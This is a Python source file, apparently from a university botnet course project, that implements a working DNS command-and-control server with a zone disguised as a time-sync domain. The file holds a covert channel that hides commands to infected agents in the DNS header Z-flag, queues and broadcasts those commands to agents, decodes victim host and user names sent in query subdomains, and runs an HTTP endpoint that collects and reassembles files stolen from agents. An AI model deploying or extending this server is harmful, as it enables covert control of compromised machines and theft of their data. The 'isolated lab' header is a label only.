"""
====================================================
 AUA CS 232/337 — Botnet Research Project
 Component: Authoritative DNS C2 Server (Z-Flag)
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching points implemented here (from Spinnekop reference):

1. AUTHORITATIVE DNS SERVER
   An authoritative DNS server is the final authority for a zone.
   Unlike recursive resolvers, it doesn't forward queries —
   it answers directly from its zone configuration.

   Zone hierarchy:
     Zone name:    timeserversync.com.
     SOA record:   authoritative start-of-authority
     NS records:   nameserver declarations
     A records:    IPv4 mappings (including wildcards)
     TXT records:  text data

   Wildcard A record (*.domain.com) is critical:
   any subdomain resolves to the C2 IP, enabling the agent to
   encode arbitrary data in subdomain labels and still get a
   valid DNS response — the data is recovered server-side.

2. Z-FLAG INJECTION (per-agent command queue)
   Spinnekop's documented design: per-agent command queues
   with agent ID extracted from the query subdomain.
   Spinnekop's actual implementation: time-based simulation.
   This implementation: the correct per-agent queue design.

3. RATE LIMITING (enforced, not just parsed)
   Spinnekop: parsed config, never enforced at request time.
   This implementation: token-bucket rate limiter per source IP.

4. QUERY TYPE FILTERING (enforced, not just warned)
   Spinnekop: logged a warning but served the response anyway.
   This implementation: returns NOTIMP for disallowed types.

5. HTTP EXFIL HANDLER WITH PER-AGENT DIRECTORIES
   Spinnekop: saved all uploads to exfilled.zip (no agent_id).
   This implementation: exfiltrated/<agent_id>/chunk_N.dat
   and reassembles when all chunks arrive.

6. MONITORING / HEALTH / METRICS ENDPOINTS
   Spinnekop: MonitoringConfig struct, never started.
   This implementation: /health and /metrics HTTP endpoints.

7. FAILURE SIMULATION (development mode)
   Spinnekop: SimulateFailures config, never used.
   This implementation: configurable failure_rate drops requests.

8. PACKET CAPTURE (development mode)
   Spinnekop: PacketCaptureConfig struct, never used.
   This implementation: saves raw DNS packets to pcap-style file.

Usage:
  # Start server (requires root for port 53):
  sudo python3 dns_zflag_server.py

  # Queue a Z-command for an agent:
  curl -X POST http://localhost:8080/command \\
       -H "Content-Type: application/json" \\
       -d '{"agent_id":"DESKTOP-ABC123", "z_value": 2}'

  # View all agents:
  curl http://localhost:8080/agents

  # Metrics:
  curl http://localhost:8081/metrics
"""

import base64
import json
import math
import os
import random
import socket
import struct
import sys
import threading
import time
from collections import defaultdict, deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Optional, Tuple

# Reuse the crafting utilities
sys.path.insert(0, os.path.dirname(__file__))
from dns_zflag_crafter import (
    Z_CLEAR_MASK, Z_COMMAND_MAP, QTYPE_MAP, QTYPE_REVERSE,
    QCLASS_MAP, QCLASS_REVERSE, RCODE_MAP,
    apply_z_flag, read_z_flag, read_header, read_flags,
    _decode_name, _parse_rr, visualize_packet,
    decode_subdomain_info, is_likely_encoded_subdomain,
    encode_dns_name, shannon_entropy,
)


# ─────────────────────────────────────────────────────────────
#  SERVER CONFIGURATION
#  Mirrors Spinnekop internal/models/srv_models/models_srv.go
# ─────────────────────────────────────────────────────────────

class ServerConfig:
    """
    Complete DNS server configuration.
    All fields validated before the server starts — errors abort startup.
    """
    def __init__(self, **kw):
        # Server settings
        self.bind_address: str  = kw.get("bind_address", "0.0.0.0")
        self.port: int           = kw.get("port", 53)
        self.max_workers: int    = kw.get("max_workers", 4)
        self.worker_buf: int     = kw.get("worker_buf", 10)
        self.read_timeout: float = kw.get("read_timeout", 5.0)
        self.write_timeout: float= kw.get("write_timeout", 3.0)
        self.max_packet_size: int= kw.get("max_packet_size", 512)

        # Logging
        self.log_level: str      = kw.get("log_level", "DEBUG")
        self.log_queries: bool   = kw.get("log_queries", True)
        self.log_responses: bool = kw.get("log_responses", True)
        self.packet_dump: bool   = kw.get("packet_dump", False)

        # Zone
        self.zone_name: str      = kw.get("zone_name", "timeserversync.com.")
        self.zone_ip: str        = kw.get("zone_ip", "127.0.0.1")
        self.zone_ttl: int       = kw.get("zone_ttl", 300)

        # Rate limiting — ENFORCED (fixes Spinnekop gap)
        self.rate_limit_enabled: bool = kw.get("rate_limit_enabled", True)
        self.max_qps: int             = kw.get("max_qps", 20)
        self.max_qpm: int             = kw.get("max_qpm", 200)
        self.blacklist_duration: float= kw.get("blacklist_duration", 30.0)

        # Query filtering — ENFORCED (fixes Spinnekop gap)
        self.allowed_qtypes: List[str] = kw.get(
            "allowed_qtypes", ["A", "AAAA", "TXT", "NS", "SOA", "MX", "CNAME"]
        )
        self.blocked_ips: List[str]   = kw.get("blocked_ips", [])
        self.allowed_ips: List[str]   = kw.get("allowed_ips", [])
        self.refuse_recursion: bool   = kw.get("refuse_recursion", True)

        # Monitoring — IMPLEMENTED (fixes Spinnekop gap)
        self.metrics_enabled: bool   = kw.get("metrics_enabled", True)
        self.metrics_port: int       = kw.get("metrics_port", 8080)
        self.health_port: int        = kw.get("health_port", 8081)

        # HTTP exfil
        self.http_exfil_enabled: bool= kw.get("http_exfil_enabled", True)
        self.exfil_dir: str          = kw.get("exfil_dir", "/tmp/exfiltrated")

        # Development — IMPLEMENTED (fixes Spinnekop gap)
        self.simulate_failures: bool = kw.get("simulate_failures", False)
        self.failure_rate: float     = kw.get("failure_rate", 0.05)
        self.packet_capture: bool    = kw.get("packet_capture", False)
        self.capture_dir: str        = kw.get("capture_dir", "/tmp/dns_captures")

    def validate(self) -> List[str]:
        """Return list of validation errors (empty = valid)."""
        errs = []
        try:
            socket.inet_aton(self.bind_address)
        except Exception:
            errs.append(f"bind_address '{self.bind_address}' is not a valid IP")
        if not (1 <= self.port <= 65535):
            errs.append(f"port {self.port} out of range 1-65535")
        if not (1 <= self.max_workers <= 1000):
            errs.append(f"max_workers {self.max_workers} out of range 1-1000")
        if not (1 <= self.read_timeout <= 300):
            errs.append(f"read_timeout {self.read_timeout} must be 1-300s")
        if self.max_packet_size < 512:
            errs.append(f"max_packet_size must be ≥512 bytes")
        if not (0.0 <= self.failure_rate <= 1.0):
            errs.append(f"failure_rate {self.failure_rate} must be 0.0-1.0")
        return errs

    def get_address(self) -> str:
        return f"{self.bind_address}:{self.port}"


# ─────────────────────────────────────────────────────────────
#  PER-AGENT Z-VALUE COMMAND QUEUE
#  Mirrors Spinnekop architecture doc ZScheduler (FIXES the
#  actual implementation that used wall-clock simulation).
# ─────────────────────────────────────────────────────────────

class ZCommandQueue:
    """
    Per-agent command queue.

    Spinnekop's documented design was correct:
      commandQueue map[agentID][]uint8

    Spinnekop's actual implementation used time-elapsed simulation
    with no per-agent differentiation. This fixes that.

    Teaching point: each agent beacon carries its identity in the
    subdomain. The server decodes it, looks up the queue for that
    agent, dequeues one command, and injects it as the Z-value.
    If the queue is empty, it returns Z=0 (CONTINUE).
    """

    def __init__(self):
        self._lock     = threading.Lock()
        self._queues: Dict[str, deque] = defaultdict(deque)
        self._history: Dict[str, List] = defaultdict(list)
        self._seen: Dict[str, float]   = {}

    def enqueue(self, agent_id: str, z_value: int) -> None:
        if not (0 <= z_value <= 7):
            raise ValueError(f"Z-value must be 0-7, got {z_value}")
        with self._lock:
            self._queues[agent_id].append(z_value)
        print(f"[z-queue] Queued Z={z_value} ({Z_COMMAND_MAP[z_value]}) "
              f"for agent '{agent_id}' "
              f"(queue depth: {len(self._queues[agent_id])})")

    def dequeue(self, agent_id: str) -> int:
        """Return next command for agent, or 0 (CONTINUE) if queue empty."""
        with self._lock:
            self._seen[agent_id] = time.time()
            if self._queues[agent_id]:
                z = self._queues[agent_id].popleft()
                self._history[agent_id].append({
                    "z": z, "cmd": Z_COMMAND_MAP[z],
                    "ts": datetime.now().isoformat()
                })
                return z
        return 0

    def peek(self, agent_id: str) -> Optional[int]:
        with self._lock:
            q = self._queues[agent_id]
            return q[0] if q else None

    def queue_depth(self, agent_id: str) -> int:
        with self._lock:
            return len(self._queues[agent_id])

    def list_agents(self) -> Dict:
        with self._lock:
            return {
                aid: {
                    "pending":      list(self._queues[aid]),
                    "last_seen":    self._seen.get(aid, 0),
                    "history_len":  len(self._history[aid]),
                }
                for aid in set(self._queues) | set(self._seen)
            }

    def broadcast(self, z_value: int) -> int:
        """Queue z_value for every known agent. Returns count."""
        known = list(self._seen.keys())
        for agent_id in known:
            self.enqueue(agent_id, z_value)
        return len(known)


# ─────────────────────────────────────────────────────────────
#  RATE LIMITER (token-bucket per source IP)
#  Fixes Spinnekop: RateLimitingConfig was parsed but never
#  checked during query processing.
# ─────────────────────────────────────────────────────────────

class RateLimiter:
    """
    Token-bucket rate limiter per source IP.
    Also maintains a sliding-window per-minute counter.
    Blacklists IPs that exceed limits for blacklist_duration seconds.
    """

    def __init__(self, max_qps: int, max_qpm: int, blacklist_sec: float):
        self.max_qps       = max_qps
        self.max_qpm       = max_qpm
        self.blacklist_sec = blacklist_sec
        self._lock         = threading.Lock()
        # token-bucket: {ip: (tokens, last_refill_time)}
        self._buckets: Dict[str, List] = {}
        # minute window: {ip: deque of timestamps}
        self._minute: Dict[str, deque] = defaultdict(lambda: deque(maxlen=10000))
        # blacklist: {ip: blacklist_until_time}
        self._blacklist: Dict[str, float] = {}
        self._stats = {"total_allowed": 0, "total_blocked": 0}

    def allow(self, ip: str) -> bool:
        now = time.time()
        with self._lock:
            # Check blacklist
            until = self._blacklist.get(ip, 0)
            if now < until:
                self._stats["total_blocked"] += 1
                return False
            elif until > 0:
                del self._blacklist[ip]

            # Token bucket (per-second)
            tokens, last = self._buckets.get(ip, (self.max_qps, now))
            elapsed = now - last
            tokens  = min(self.max_qps, tokens + elapsed * self.max_qps)
            if tokens < 1:
                self._blacklist[ip] = now + self.blacklist_sec
                self._stats["total_blocked"] += 1
                return False
            self._buckets[ip] = [tokens - 1, now]

            # Sliding window per-minute
            q = self._minute[ip]
            q.append(now)
            cutoff = now - 60.0
            while q and q[0] < cutoff:
                q.popleft()
            if len(q) > self.max_qpm:
                self._blacklist[ip] = now + self.blacklist_sec
                self._stats["total_blocked"] += 1
                return False

            self._stats["total_allowed"] += 1
            return True

    def stats(self) -> Dict:
        with self._lock:
            return dict(self._stats)


# ─────────────────────────────────────────────────────────────
#  ZONE (DNS records)
# ─────────────────────────────────────────────────────────────

class Zone:
    """
    DNS zone: a collection of records the server is authoritative for.
    Supports wildcard A records (*.domain.com → IP).
    """

    def __init__(self, name: str, ip: str, ttl: int = 300):
        if not name.endswith("."):
            name += "."
        self.name = name.lower()
        self.ip   = ip
        self.ttl  = ttl

    def matches(self, qname: str) -> bool:
        qname = qname.lower()
        return qname == self.name or qname.endswith("." + self.name)

    def build_a_response(self, qname: str, msg_id: int,
                         original_flags: int) -> bytes:
        """Build a complete DNS response for an A query."""
        # Response flags: copy RD, set QR, set AA
        flags = original_flags | 0x8400   # QR=1, AA=1
        flags &= 0xFFF0                   # clear RCODE
        header = struct.pack("!HHHHHH",
                             msg_id, flags, 1, 1, 0, 0)
        qname_enc = encode_dns_name(qname)
        question = qname_enc + struct.pack("!HH", 1, 1)  # A, IN

        # Answer RR: name pointer 0xC00C → start of question name
        try:
            ip_bytes = socket.inet_aton(self.ip)
        except Exception:
            ip_bytes = b"\x00" * 4
        answer = (b"\xc0\x0c" +                              # name pointer
                  struct.pack("!HHiH", 1, 1, self.ttl, 4) + # A, IN, TTL, RDLENGTH
                  ip_bytes)
        return header + question + answer


# ─────────────────────────────────────────────────────────────
#  PACKET CAPTURE (simple binary log — fixes Spinnekop gap)
# ─────────────────────────────────────────────────────────────

class PacketCapture:
    """
    Minimal pcap-compatible packet logger.
    Writes a proper pcap file header + records.
    Fixes Spinnekop: PacketCaptureConfig was defined, never used.
    """
    MAGIC = 0xA1B2C3D4
    HEADER_FMT = "<IHHiIII"  # magic, maj, min, zone, sigfigs, snaplen, linktype

    def __init__(self, directory: str, max_files: int = 100):
        os.makedirs(directory, exist_ok=True)
        self._dir      = directory
        self._max      = max_files
        self._lock     = threading.Lock()
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._path = os.path.join(directory, f"dns_capture_{ts}.pcap")
        self._f    = open(self._path, "wb")
        # Write pcap global header (UDP-over-IPv4 → linktype LINUX_SLL=113,
        # but use RAW linktype=101 for simplicity with just DNS payload)
        self._f.write(struct.pack(
            self.HEADER_FMT,
            self.MAGIC, 2, 4, 0, 0, 65535, 101  # RAW IP linktype
        ))
        self._count = 0

    def write(self, data: bytes, src_ip: str = "") -> None:
        now = time.time()
        ts_sec  = int(now)
        ts_usec = int((now % 1) * 1e6)
        with self._lock:
            self._f.write(struct.pack("<IIII",
                                      ts_sec, ts_usec,
                                      len(data), len(data)))
            self._f.write(data)
            self._f.flush()
            self._count += 1

    def close(self) -> None:
        with self._lock:
            self._f.close()
        print(f"[capture] Saved {self._count} packets → {self._path}")


# ─────────────────────────────────────────────────────────────
#  DNS SERVER STATISTICS
# ─────────────────────────────────────────────────────────────

class ServerStats:
    def __init__(self):
        self._lock       = threading.Lock()
        self.start_time  = time.time()
        self.queries_rx  = 0
        self.responses_tx= 0
        self.refused     = 0
        self.nxdomain    = 0
        self.rate_blocked= 0
        self.filter_blocked= 0
        self.simulated_failures= 0
        self.z_injections: Dict[int, int] = defaultdict(int)
        self.agents_seen: Dict[str, float]= {}

    def record_query(self) -> None:
        with self._lock: self.queries_rx += 1

    def record_response(self, z: int) -> None:
        with self._lock:
            self.responses_tx += 1
            self.z_injections[z] += 1

    def record_agent(self, agent_id: str) -> None:
        with self._lock:
            self.agents_seen[agent_id] = time.time()

    def to_dict(self) -> Dict:
        with self._lock:
            uptime = time.time() - self.start_time
            return {
                "uptime_seconds":   round(uptime, 1),
                "queries_received": self.queries_rx,
                "responses_sent":   self.responses_tx,
                "refused":          self.refused,
                "nxdomain":         self.nxdomain,
                "rate_blocked":     self.rate_blocked,
                "filter_blocked":   self.filter_blocked,
                "simulated_failures": self.simulated_failures,
                "z_distribution":   dict(self.z_injections),
                "agents_seen":      len(self.agents_seen),
                "agent_ids":        list(self.agents_seen.keys()),
            }


# ─────────────────────────────────────────────────────────────
#  HTTP EXFIL HANDLER (with agent_id + per-agent dirs)
#  Fixes Spinnekop: missing agent_id, single output file
# ─────────────────────────────────────────────────────────────

class ExfilHandler:
    """
    Receive chunked base64 uploads from agents.
    Stores chunks per agent_id, reassembles when complete.
    Endpoint: POST /upload?agent_id=X&chunk=N&total=M
    """

    def __init__(self, base_dir: str):
        self._base = base_dir
        self._lock = threading.Lock()
        # {agent_id: {chunk_idx: data_str}}
        self._chunks: Dict[str, Dict[int, str]] = defaultdict(dict)
        os.makedirs(base_dir, exist_ok=True)

    def receive_chunk(self, agent_id: str, chunk_idx: int,
                      total: int, data: bytes) -> bool:
        """
        Store one chunk. Returns True if file is now complete.
        """
        agent_dir = os.path.join(self._base, agent_id)
        os.makedirs(agent_dir, exist_ok=True)

        chunk_path = os.path.join(agent_dir, f"chunk_{chunk_idx:04d}.dat")
        with open(chunk_path, "wb") as f:
            f.write(data)

        with self._lock:
            self._chunks[agent_id][chunk_idx] = chunk_path
            received = len(self._chunks[agent_id])

        print(f"[exfil] agent={agent_id} chunk={chunk_idx+1}/{total} "
              f"({len(data)} bytes)")

        if received == total:
            self._reassemble(agent_id, total)
            return True
        return False

    def _reassemble(self, agent_id: str, total: int) -> None:
        """Decode all chunks from base64 and reassemble to final file."""
        agent_dir = os.path.join(self._base, agent_id)
        all_b64 = ""

        with self._lock:
            for idx in range(total):
                path = self._chunks[agent_id].get(idx)
                if path and os.path.exists(path):
                    with open(path, "rb") as f:
                        all_b64 += f.read().decode(errors="replace")

        try:
            decoded = base64.b64decode(all_b64)
            out_path = os.path.join(agent_dir, "reassembled_file.bin")
            with open(out_path, "wb") as f:
                f.write(decoded)
            print(f"[exfil] ✅ Reassembled {len(decoded)} bytes for agent "
                  f"'{agent_id}' → {out_path}")
        except Exception as e:
            print(f"[exfil] ❌ Reassembly error for agent '{agent_id}': {e}")

        with self._lock:
            del self._chunks[agent_id]


# ─────────────────────────────────────────────────────────────
#  METRICS / HEALTH HTTP ENDPOINTS
#  Fixes Spinnekop: MonitoringConfig defined, never started
# ─────────────────────────────────────────────────────────────

def _make_http_handler(server_ref):
    """Factory for HTTP handler with closure over server reference."""

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):
            pass  # suppress default Apache-style logs

        def _json(self, code: int, obj: dict) -> None:
            body = json.dumps(obj, indent=2).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            srv: "DNSZFlagServer" = server_ref
            if self.path in ("/health", "/healthz"):
                self._json(200, {
                    "status": "ok",
                    "uptime": round(time.time() - srv.stats.start_time, 1),
                    "agents": len(srv.z_queue.list_agents()),
                })
            elif self.path == "/metrics":
                self._json(200, {
                    "stats":   srv.stats.to_dict(),
                    "rate_limiter": srv.rate_limiter.stats() if srv.config.rate_limit_enabled else {},
                    "agents":  srv.z_queue.list_agents(),
                })
            elif self.path == "/agents":
                self._json(200, srv.z_queue.list_agents())
            else:
                self._json(404, {"error": "not found"})

        def do_POST(self):
            srv: "DNSZFlagServer" = server_ref
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length) if length else b""

            # Command queue endpoint
            if self.path == "/command":
                try:
                    req = json.loads(body)
                    aid = req.get("agent_id", "*")
                    z   = int(req.get("z_value", 0))
                    if aid == "*":
                        n = srv.z_queue.broadcast(z)
                        self._json(200, {"status": "broadcast", "agents": n})
                    else:
                        srv.z_queue.enqueue(aid, z)
                        self._json(200, {"status": "queued", "agent_id": aid,
                                         "z_value": z, "command": Z_COMMAND_MAP.get(z)})
                except Exception as e:
                    self._json(400, {"error": str(e)})

            # Exfil upload endpoint (matches agent /upload?agent_id=X&chunk=N&total=M)
            elif self.path.startswith("/upload"):
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(self.path)
                qs     = parse_qs(parsed.query)
                aid    = qs.get("agent_id", ["unknown"])[0]
                chunk  = int(qs.get("chunk",  ["0"])[0])
                total  = int(qs.get("total",  ["1"])[0])
                srv.exfil.receive_chunk(aid, chunk, total, body)
                self._json(200, {"status": "received"})

            else:
                self._json(404, {"error": "not found"})

    return _Handler


def _start_http_server(handler_class, port: int, label: str) -> threading.Thread:
    httpd = HTTPServer(("0.0.0.0", port), handler_class)
    t = threading.Thread(target=httpd.serve_forever,
                         name=f"http-{label}", daemon=True)
    t.start()
    print(f"[http] {label} listening on :{port}")
    return t


# ─────────────────────────────────────────────────────────────
#  DNS QUERY PROCESSOR
# ─────────────────────────────────────────────────────────────

class QueryProcessor:
    """
    Parses a raw DNS query and builds the response.
    Enforces query type filtering and recursion policy.
    """

    def __init__(self, zone: Zone, config: ServerConfig,
                 z_queue: ZCommandQueue, stats: ServerStats):
        self.zone   = zone
        self.cfg    = config
        self.z_q    = z_queue
        self.stats  = stats
        self._allowed_types = set(
            QTYPE_MAP.get(t.upper(), 0)
            for t in config.allowed_qtypes
        )

    def process(self, data: bytes, client_ip: str) -> Optional[bytes]:
        """
        Parse query, apply all enforcement, build and return response bytes.
        Returns None to drop the packet silently.
        """
        if len(data) < 12:
            return None

        hdr = read_header(data)
        msg_id     = hdr["id"]
        original_flags = struct.unpack_from("!H", data, 2)[0]

        # Parse question
        offset = 12
        try:
            qname, offset = _decode_name(data, offset)
            qtype, qclass = struct.unpack_from("!HH", data, offset)
            offset += 4
        except Exception:
            return None

        qname_lower = qname.lower()
        qtype_str   = QTYPE_REVERSE.get(qtype, str(qtype))

        if self.cfg.log_queries:
            print(f"  [query] {client_ip} → {qname_lower} {qtype_str} "
                  f"(Z={hdr.get('z',0)})")

        # Refuse recursion if configured
        if self.cfg.refuse_recursion and hdr.get("rd"):
            pass  # accept but do not recurse; we are authoritative only

        # Query type filtering — ENFORCED (fixes Spinnekop gap)
        if self._allowed_types and qtype not in self._allowed_types:
            self.stats.filter_blocked += 1
            print(f"  [filter] Blocked unsupported type {qtype_str} from {client_ip}")
            return self._make_error_response(data, msg_id, original_flags, rcode=4)  # NOTIMP

        # Blocked IP filtering
        if client_ip in self.cfg.blocked_ips:
            return None
        if self.cfg.allowed_ips and client_ip not in self.cfg.allowed_ips:
            return None

        # Failure simulation — IMPLEMENTED (fixes Spinnekop gap)
        if self.cfg.simulate_failures and random.random() < self.cfg.failure_rate:
            self.stats.simulated_failures += 1
            return None

        # Non-standard class detection (log warning)
        if qclass not in (1, 255):
            print(f"  [warn] Non-standard class {qclass} from {client_ip} — "
                  f"possible covert channel / class manipulation")

        # Detect encoded subdomain (Z=2 exfiltration)
        labels = qname_lower.rstrip(".").split(".")
        if len(labels) >= 3:
            sub = labels[0]
            if is_likely_encoded_subdomain(sub):
                decoded = decode_subdomain_info(sub)
                h = shannon_entropy(sub)
                print(f"  [enum] Encoded subdomain from {client_ip}: '{sub[:30]}…'")
                print(f"         Entropy={h:.2f} bits/char  |  Decoded: {decoded}")

        # Determine agent ID (subdomain or client IP)
        agent_id = self._extract_agent_id(qname_lower, client_ip)
        self.stats.record_agent(agent_id)

        # Build response
        if not self.zone.matches(qname_lower):
            self.stats.nxdomain += 1
            return self._make_error_response(data, msg_id, original_flags, rcode=5)  # REFUSED

        if qtype not in (QTYPE_MAP["A"], QTYPE_MAP["ANY"]):
            # For simplicity: only serve A records in this implementation
            return self._make_error_response(data, msg_id, original_flags, rcode=3)  # NXDOMAIN

        # Build A response
        response = bytearray(self.zone.build_a_response(
            qname_lower, msg_id, original_flags
        ))

        # Inject Z-value from agent's command queue
        z_value = self.z_q.dequeue(agent_id)
        apply_z_flag(response, z_value)
        self.stats.record_response(z_value)

        if self.cfg.log_responses:
            print(f"  [resp] → {client_ip} NOERROR {self.zone.ip} "
                  f"Z={z_value} ({Z_COMMAND_MAP.get(z_value,'?')})")

        if self.cfg.packet_dump:
            visualize_packet(bytes(response), "Response")

        return bytes(response)

    def _extract_agent_id(self, qname: str, fallback: str) -> str:
        """
        Extract agent identifier from query.
        If the first label is an encoded subdomain (Z=2 output),
        decode it as the agent fingerprint.
        Otherwise use client IP.
        """
        parts = qname.rstrip(".").split(".")
        if len(parts) >= 3 and is_likely_encoded_subdomain(parts[0]):
            decoded = decode_subdomain_info(parts[0])
            # Use hostname\\user as the agent ID
            return decoded.split("\\")[0] if "\\" in decoded else decoded[:32]
        return fallback

    @staticmethod
    def _make_error_response(original_data: bytes, msg_id: int,
                              original_flags: int, rcode: int) -> bytes:
        flags = (original_flags | 0x8000) & 0xFFF0  # QR=1, clear RCODE
        flags |= (rcode & 0x0F)
        if len(original_data) >= 12:
            qdcount = struct.unpack_from("!H", original_data, 4)[0]
        else:
            qdcount = 0
        header = struct.pack("!HHHHHH", msg_id, flags, qdcount, 0, 0, 0)
        # Re-include the question section from original query
        if len(original_data) > 12:
            return header + original_data[12:]
        return header


# ─────────────────────────────────────────────────────────────
#  WORKER
# ─────────────────────────────────────────────────────────────

class Worker(threading.Thread):
    def __init__(self, worker_id: str, processor: QueryProcessor,
                 conn: socket.socket, capture: Optional[PacketCapture],
                 buf_size: int = 10):
        super().__init__(name=f"worker-{worker_id}", daemon=True)
        self._proc   = processor
        self._conn   = conn
        self._cap    = capture
        self._queue: deque = deque(maxlen=buf_size)
        self._cond   = threading.Condition()
        self._stop   = threading.Event()

    def enqueue(self, data: bytes, addr: Tuple[str, int]) -> bool:
        with self._cond:
            if len(self._queue) >= self._queue.maxlen:
                return False
            self._queue.append((data, addr))
            self._cond.notify()
            return True

    def run(self) -> None:
        while not self._stop.is_set():
            with self._cond:
                while not self._queue and not self._stop.is_set():
                    self._cond.wait(timeout=1.0)
                if not self._queue:
                    continue
                data, addr = self._queue.popleft()

            if self._cap:
                self._cap.write(data, src_ip=addr[0])

            response = self._proc.process(data, addr[0])
            if response:
                try:
                    self._conn.sendto(response, addr)
                except Exception as e:
                    print(f"  [worker] Send error to {addr}: {e}")

    def stop(self) -> None:
        self._stop.set()
        with self._cond:
            self._cond.notify_all()


# ─────────────────────────────────────────────────────────────
#  DNS SERVER (top-level)
# ─────────────────────────────────────────────────────────────

class DNSZFlagServer:
    """
    Full authoritative DNS C2 server with:
    - Per-agent Z-value command queue
    - Wildcard A record resolution
    - Rate limiting (enforced)
    - Query type filtering (enforced)
    - HTTP exfil with agent_id + per-agent directories
    - /health and /metrics endpoints
    - Packet capture (optional)
    - Failure simulation (optional)
    """

    def __init__(self, config: Optional[ServerConfig] = None):
        self.config  = config or ServerConfig()
        self.z_queue = ZCommandQueue()
        self.stats   = ServerStats()
        self.zone    = Zone(self.config.zone_name,
                            self.config.zone_ip,
                            self.config.zone_ttl)
        self.rate_limiter = RateLimiter(
            self.config.max_qps,
            self.config.max_qpm,
            self.config.blacklist_duration,
        ) if self.config.rate_limit_enabled else None

        self.capture = (PacketCapture(self.config.capture_dir)
                        if self.config.packet_capture else None)
        self.exfil   = ExfilHandler(self.config.exfil_dir)

        self._processor = QueryProcessor(
            self.zone, self.config, self.z_queue, self.stats
        )
        self._workers: List[Worker] = []
        self._conn: Optional[socket.socket] = None
        self._stop  = threading.Event()

    def start(self) -> None:
        """Validate config, start workers, accept loop, HTTP endpoints."""
        errs = self.config.validate()
        if errs:
            for e in errs:
                print(f"[config] ERROR: {e}")
            sys.exit(1)

        # Start HTTP control plane
        if self.config.metrics_enabled:
            handler = _make_http_handler(self)
            _start_http_server(handler, self.config.metrics_port, "metrics+control")
            _start_http_server(handler, self.config.health_port, "health")

        # Bind UDP socket
        self._conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._conn.bind((self.config.bind_address, self.config.port))
        self._conn.settimeout(self.config.read_timeout)

        # Start workers
        for i in range(self.config.max_workers):
            w = Worker(
                str(i), self._processor, self._conn, self.capture,
                self.config.worker_buf
            )
            w.start()
            self._workers.append(w)

        self._print_banner()

        # Accept loop
        buf = bytearray(self.config.max_packet_size)
        while not self._stop.is_set():
            try:
                n, addr = self._conn.recvfrom_into(buf)
            except socket.timeout:
                continue
            except Exception as e:
                if not self._stop.is_set():
                    print(f"[server] recv error: {e}")
                continue

            data = bytes(buf[:n])
            src_ip = addr[0]
            self.stats.record_query()

            # Rate limiting — ENFORCED
            if self.rate_limiter and not self.rate_limiter.allow(src_ip):
                self.stats.rate_blocked += 1
                continue  # silently drop

            # Round-robin to workers
            idx = n % len(self._workers)
            if not self._workers[idx].enqueue(data, addr):
                print(f"[server] Worker {idx} queue full — dropping from {src_ip}")

    def shutdown(self) -> None:
        print("[server] Shutting down...")
        self._stop.set()
        for w in self._workers:
            w.stop()
        if self._conn:
            self._conn.close()
        if self.capture:
            self.capture.close()
        print("[server] Stopped.")

    def _print_banner(self) -> None:
        print("\n🕸  DNS Z-Flag C2 Server (Spinnekop-compatible)")
        print("=" * 50)
        print(f"  Listening:   {self.config.get_address()}")
        print(f"  Zone:        {self.zone.name} → {self.zone.ip}")
        print(f"  Workers:     {self.config.max_workers}")
        print(f"  Rate limit:  {self.config.max_qps} qps / {self.config.max_qpm} qpm")
        print(f"  Allowed types: {', '.join(self.config.allowed_qtypes)}")
        print(f"  Metrics:     :{self.config.metrics_port}/metrics")
        print(f"  Health:      :{self.config.health_port}/health")
        print(f"  Exfil dir:   {self.config.exfil_dir}")
        if self.config.simulate_failures:
            print(f"  ⚠ Failure simulation: {self.config.failure_rate*100:.0f}% drop rate")
        if self.config.packet_capture:
            print(f"  📦 Packet capture: {self.config.capture_dir}")
        print("=" * 50)
        print("  Z-value commands:")
        for z, cmd in Z_COMMAND_MAP.items():
            print(f"    Z={z} → {cmd}")
        print("\n  Queue a command:  POST :8080/command "
              '{"agent_id":"*","z_value":2}')
        print()


# ─────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse, signal

    ap = argparse.ArgumentParser(description="DNS Z-Flag C2 Server")
    ap.add_argument("--bind",       default="0.0.0.0")
    ap.add_argument("--port",       type=int,   default=53)
    ap.add_argument("--zone",       default="timeserversync.com.")
    ap.add_argument("--zone-ip",    default="127.0.0.1")
    ap.add_argument("--workers",    type=int,   default=4)
    ap.add_argument("--metrics-port", type=int, default=8080)
    ap.add_argument("--health-port",  type=int, default=8081)
    ap.add_argument("--packet-dump",  action="store_true")
    ap.add_argument("--capture",      action="store_true")
    ap.add_argument("--sim-fail",     type=float, default=0.0)
    ap.add_argument("--no-rate-limit",action="store_true")
    args = ap.parse_args()

    cfg = ServerConfig(
        bind_address     = args.bind,
        port             = args.port,
        zone_name        = args.zone,
        zone_ip          = args.zone_ip,
        max_workers      = args.workers,
        metrics_port     = args.metrics_port,
        health_port      = args.health_port,
        packet_dump      = args.packet_dump,
        packet_capture   = args.capture,
        simulate_failures= args.sim_fail > 0,
        failure_rate     = args.sim_fail,
        rate_limit_enabled= not args.no_rate_limit,
    )

    srv = DNSZFlagServer(cfg)

    def _sig_handler(sig, frame):
        srv.shutdown()
        sys.exit(0)
    signal.signal(signal.SIGINT,  _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)

    try:
        srv.start()
    except PermissionError:
        print(f"[error] Cannot bind to port {args.port}. Run with sudo.")
        sys.exit(1)
